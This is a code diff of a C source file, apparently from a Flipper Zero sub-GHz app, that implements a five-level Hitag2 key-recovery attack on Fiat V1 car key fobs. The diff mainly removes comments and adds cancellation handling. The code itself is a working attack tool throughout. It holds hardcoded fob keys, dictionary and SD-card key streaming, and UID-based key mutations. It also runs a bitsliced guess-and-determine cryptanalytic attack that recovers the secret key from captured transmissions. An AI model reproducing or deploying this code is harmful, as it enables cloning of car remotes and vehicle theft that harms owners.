@@ -1,13 +1,3 @@
-// [HITAG2_BF] Hitag2 bruteforce state machine for Fiat V1
-//
-// Cascade L1..L5:
-//   L1 Known    - 8 keys hardcoded in fiat_v1.c
-//   L2 FlashDct - ~90 curated keys embedded in flash
-//   L3 SDDict   - streaming dictionary from apps_data/subghz/assets/
-//   L4 Heurist  - mutations (UID-derived, epoch, byte increments)
-//   L5 Hitag2Hl - guess-and-determine attack (Hitag2Hell) via
-//                 subghz_hitag2_hell.h, 32-way bitsliced adapted to Fiat V1.
-
 #include "hitag2_bf.h"
 #include "hitag2_core.h"
 #include "hitag2_hell.h"
@@ -18,10 +8,6 @@
 
 #define TAG "Hitag2Bf"
 
-// Local copy of the 8 hard-coded Fiat V1 keys (matches fiat_v1_known_keys[]
-// in lib/subghz/protocols/fiat_v1.c). Duplicated here rather than exported
-// from core subghz, per this app's standalone-.fap design (see fox_tpms for
-// the same precedent) - it's just public key data, not logic.
 #define HITAG2_BF_KNOWN_KEY_COUNT 8U
 static const uint8_t hitag2_bf_known_keys[HITAG2_BF_KNOWN_KEY_COUNT][6] = {
     {0xB7U, 0x92U, 0x80U, 0xAEU, 0xCCU, 0x37U},
@@ -34,15 +20,10 @@ static const uint8_t hitag2_bf_known_keys[HITAG2_BF_KNOWN_KEY_COUNT][6] = {
     {0x33U, 0xFAU, 0x2FU, 0xCDU, 0xC3U, 0x3BU},
 };
 
-// Yield-to-scheduler cadence (keys tested between callback invocations)
 #define SUBGHZ_HITAG2_BF_YIELD_INTERVAL 512U
 
-// L4 heuristic: how many mutations to try
 #define SUBGHZ_HITAG2_BF_L4_MAX_KEYS 65536U
 
-// L5 (Hitag2Hell): full L0 sweep is 2^20 slots. We split into chunks so we
-// can call progress + yield often, and also to allow the caller to cancel
-// promptly. Chunk size = 4096 slots ~= a few seconds each on Cortex-M4.
 #define SUBGHZ_HITAG2_BF_L5_CHUNK_SIZE 4096U
 #define SUBGHZ_HITAG2_BF_L5_TOTAL_SLOTS (1UL << 20)
 
@@ -52,25 +33,20 @@ struct SubGhzHitag2Bf {
 
     uint8_t levels_mask;
 
-    // Result
     bool found;
     uint8_t found_key[6];
     uint32_t found_epoch;
     uint8_t found_level;
 
-    // Runtime stats
     uint64_t keys_tested_total;
 
-    // Cancellation
     volatile bool cancel;
 };
-
-// -----------------------------------------------------------------------------
 
 SubGhzHitag2Bf* subghz_hitag2_bf_alloc(void) {
     SubGhzHitag2Bf* instance = malloc(sizeof(SubGhzHitag2Bf));
     memset(instance, 0, sizeof(*instance));
-    instance->levels_mask = 0xFFU; // all levels enabled by default
+    instance->levels_mask = 0xFFU;
     return instance;
 }
 
@@ -90,12 +66,12 @@ bool subghz_hitag2_bf_add_capture(
     if(instance->capture_count >= SUBGHZ_HITAG2_BF_MAX_CAPTURES) {
         return false;
     }
-    // All captures MUST share the same UID
+
     if(instance->capture_count > 0 && instance->captures[0].uid != uid) {
         FURI_LOG_W(TAG, "Rejecting capture with different UID");
         return false;
     }
-    // Reject duplicates (same control+button)
+
     for(uint8_t i = 0; i < instance->capture_count; i++) {
         if(instance->captures[i].control == control &&
            instance->captures[i].button == button &&
@@ -158,11 +134,6 @@ bool subghz_hitag2_bf_verify_multi(
     return true;
 }
 
-// -----------------------------------------------------------------------------
-// Level implementations
-// -----------------------------------------------------------------------------
-
-// L1: 8 hardcoded known keys from fiat_v1.c
 static bool subghz_hitag2_bf_run_l1(
     SubGhzHitag2Bf* instance,
     SubGhzHitag2BfProgressCallback progress_cb,
@@ -180,17 +151,19 @@ static bool subghz_hitag2_bf_run_l1(
         instance->keys_tested_total++;
     }
     if(progress_cb) {
-        progress_cb(
-            SubGhzHitag2BfLevelKnown,
-            "Known keys",
-            100,
-            instance->keys_tested_total,
-            context);
+
+        if(!progress_cb(
+               SubGhzHitag2BfLevelKnown,
+               "Known keys",
+               100,
+               instance->keys_tested_total,
+               context)) {
+            instance->cancel = true;
+        }
     }
     return false;
 }
 
-// L2: extended flash dictionary
 static bool subghz_hitag2_bf_run_l2(
     SubGhzHitag2Bf* instance,
     SubGhzHitag2BfProgressCallback progress_cb,
@@ -225,8 +198,6 @@ static bool subghz_hitag2_bf_run_l2(
     return false;
 }
 
-// L3: SD dictionary streaming (apps_data/subghz/assets/fiat_hitag2_keys.txt)
-// Format: one 12-hex-char key per line (may have # comments and blank lines)
 static uint8_t hex_char_to_nibble(char c) {
     if(c >= '0' && c <= '9') return (uint8_t)(c - '0');
     if(c >= 'a' && c <= 'f') return (uint8_t)(c - 'a' + 10);
@@ -235,7 +206,7 @@ static uint8_t hex_char_to_nibble(char c) {
 }
 
 static bool parse_hex_key(const char* line, uint8_t key_out[6]) {
-    // Skip whitespace
+
     while(*line == ' ' || *line == '\t') line++;
     if(*line == '#' || *line == '\0' || *line == '\r' || *line == '\n') return false;
     uint8_t nibbles[12];
@@ -268,7 +239,7 @@ static bool subghz_hitag2_bf_run_l3(
         FSAM_READ, FSOM_OPEN_EXISTING);
 
     if(!opened) {
-        // Try alternative path (some flippers may have subghz/assets in EXT)
+
         storage_file_close(file);
         opened = storage_file_open(
             file, EXT_PATH("subghz/assets/fiat_hitag2_keys.txt"),
@@ -295,7 +266,7 @@ static bool subghz_hitag2_bf_run_l3(
     while(!instance->cancel) {
         uint16_t got = storage_file_read(file, &c, 1);
         if(got == 0) {
-            // EOF - process any pending line
+
             if(line_pos > 0) {
                 line_buf[line_pos] = '\0';
                 if(parse_hex_key(line_buf, key)) {
@@ -347,7 +318,7 @@ static bool subghz_hitag2_bf_run_l3(
         } else if((size_t)(line_pos + 1) < sizeof(line_buf)) {
             line_buf[line_pos++] = c;
         } else {
-            // Line too long, reset
+
             line_pos = 0;
         }
     }
@@ -358,7 +329,6 @@ static bool subghz_hitag2_bf_run_l3(
     return found;
 }
 
-// L4: heuristic mutations based on the UID and known-key patterns
 static bool subghz_hitag2_bf_run_l4(
     SubGhzHitag2Bf* instance,
     SubGhzHitag2BfProgressCallback progress_cb,
@@ -367,8 +337,6 @@ static bool subghz_hitag2_bf_run_l4(
     uint8_t key[6];
     uint32_t tried = 0;
 
-    // Strategy 1: XOR common masks with UID and pad with common tails
-    // UID split into bytes; combined with typical BCM constants
     static const uint8_t tails[][2] = {
         {0x00, 0x00}, {0xFF, 0xFF}, {0x00, 0xFF}, {0xFF, 0x00},
         {0xAA, 0x55}, {0x55, 0xAA}, {0x12, 0x34}, {0xAB, 0xCD},
@@ -419,7 +387,6 @@ static bool subghz_hitag2_bf_run_l4(
         }
     }
 
-    // Strategy 2: increment ±16 the last byte of each known key
     const uint8_t(*known_keys)[6] = hitag2_bf_known_keys;
     for(uint8_t k = 0; k < HITAG2_BF_KNOWN_KEY_COUNT; k++) {
         for(int delta = -16; delta <= 16; delta++) {
@@ -439,7 +406,6 @@ static bool subghz_hitag2_bf_run_l4(
         }
     }
 
-    // Strategy 3: try each known key with epoch 1..7 (small window)
     for(uint8_t k = 0; k < HITAG2_BF_KNOWN_KEY_COUNT; k++) {
         for(uint32_t epoch = 1; epoch <= 7; epoch++) {
             if(instance->cancel) return false;
@@ -458,26 +424,11 @@ static bool subghz_hitag2_bf_run_l4(
     return false;
 }
 
-// L5: Hitag2Hell guess-and-determine attack.
-//
-// Uses the 32-way bitsliced port in subghz_hitag2_hell.[ch]. For each capture
-// available we run the attack against its authenticator; the resulting state31
-// candidates are inverted to keys via hitag2_fiat_invert_init(); each key is
-// then cross-validated against ALL captures to eliminate false positives (the
-// per-capture false-positive rate is ~2^-32 with a single 32-bit auth; two
-// captures drops it to ~2^-64, effectively zero).
-//
-// The L0 sweep space is 2^20 slots; we split it into chunks so the progress
-// callback fires often enough to keep the UI responsive and to allow prompt
-// cancellation. Each chunk of 4096 slots takes on the order of seconds on
-// x86; on Cortex-M4 the total wall time can be several hours to a day in the
-// worst case, but many keys will be found much earlier.
-
 typedef struct {
     SubGhzHitag2Bf* instance;
     SubGhzHitag2BfProgressCallback outer_cb;
     void* outer_ctx;
-    uint32_t chunk_base;   // L0 base index of this chunk (0..2^20 in steps of CHUNK_SIZE)
+    uint32_t chunk_base;
 } Hitag2HellBridge;
 
 static bool subghz_hitag2_bf_hell_progress(
@@ -488,7 +439,7 @@ static bool subghz_hitag2_bf_hell_progress(
     if(b->instance->cancel) return false;
 
     if(b->outer_cb) {
-        // Global percent = (chunk_base + pct_within_chunk/100 * CHUNK) / TOTAL
+
         uint32_t base_slots = b->chunk_base;
         uint32_t within = (uint32_t)((SUBGHZ_HITAG2_BF_L5_CHUNK_SIZE *
                                       (uint32_t)pct_within_chunk) / 100U);
@@ -522,7 +473,6 @@ static bool subghz_hitag2_bf_try_hell_on_capture(
     bridge.outer_cb = progress_cb;
     bridge.outer_ctx = context;
 
-    // Sweep the layer-0 space in chunks
     for(uint32_t chunk_start = 0;
         chunk_start < SUBGHZ_HITAG2_BF_L5_TOTAL_SLOTS;
         chunk_start += SUBGHZ_HITAG2_BF_L5_CHUNK_SIZE) {
@@ -545,7 +495,7 @@ static bool subghz_hitag2_bf_try_hell_on_capture(
         memset(&result, 0, sizeof(result));
 
         if(hitag2_hell_recover(cap->hop, &cfg, &result)) {
-            // Try each candidate: invert to key, verify against all captures.
+
             for(uint32_t i = 0; i < result.candidate_count; i++) {
                 if(instance->cancel) return false;
                 uint8_t key[6];
@@ -554,11 +504,11 @@ static bool subghz_hitag2_bf_try_hell_on_capture(
                        cap->uid,
                        cap->button,
                        cap->control,
-                       0, // epoch = 0 (Fiat V1 default)
+                       0,
                        key)) {
                     continue;
                 }
-                // Multi-capture cross-validation
+
                 if(subghz_hitag2_bf_verify_multi(instance, key, 0)) {
                     memcpy(instance->found_key, key, 6);
                     instance->found_epoch = 0;
@@ -581,18 +531,11 @@ static bool subghz_hitag2_bf_run_l5(
     SubGhzHitag2Bf* instance,
     SubGhzHitag2BfProgressCallback progress_cb,
     void* context) {
-    // Run the attack on the first capture. Multi-capture validation happens
-    // per-candidate inside subghz_hitag2_bf_try_hell_on_capture(). Running the
-    // attack on additional captures would multiply the wall time without much
-    // gain (candidates from cap[0] already include the true key).
+
     if(instance->capture_count == 0) return false;
     return subghz_hitag2_bf_try_hell_on_capture(
         instance, &instance->captures[0], progress_cb, context);
 }
-
-// -----------------------------------------------------------------------------
-// Public run entry point
-// -----------------------------------------------------------------------------
 
 bool subghz_hitag2_bf_run(
     SubGhzHitag2Bf* instance,
@@ -605,27 +548,26 @@ bool subghz_hitag2_bf_run(
     instance->found = false;
     instance->keys_tested_total = 0;
 
-    // L1
     if(instance->levels_mask & (1U << SubGhzHitag2BfLevelKnown)) {
         if(subghz_hitag2_bf_run_l1(instance, progress_cb, context)) return true;
         if(instance->cancel) return false;
     }
-    // L2
+
     if(instance->levels_mask & (1U << SubGhzHitag2BfLevelFlashDict)) {
         if(subghz_hitag2_bf_run_l2(instance, progress_cb, context)) return true;
         if(instance->cancel) return false;
     }
-    // L3
+
     if(instance->levels_mask & (1U << SubGhzHitag2BfLevelSDDict)) {
         if(subghz_hitag2_bf_run_l3(instance, progress_cb, context)) return true;
         if(instance->cancel) return false;
     }
-    // L4
+
     if(instance->levels_mask & (1U << SubGhzHitag2BfLevelHeuristic)) {
         if(subghz_hitag2_bf_run_l4(instance, progress_cb, context)) return true;
         if(instance->cancel) return false;
     }
-    // L5 (only if we have >=1 capture, and better with >=2 captures)
+
     if(instance->levels_mask & (1U << SubGhzHitag2BfLevelHitag2Hell)) {
         if(subghz_hitag2_bf_run_l5(instance, progress_cb, context)) return true;
     }
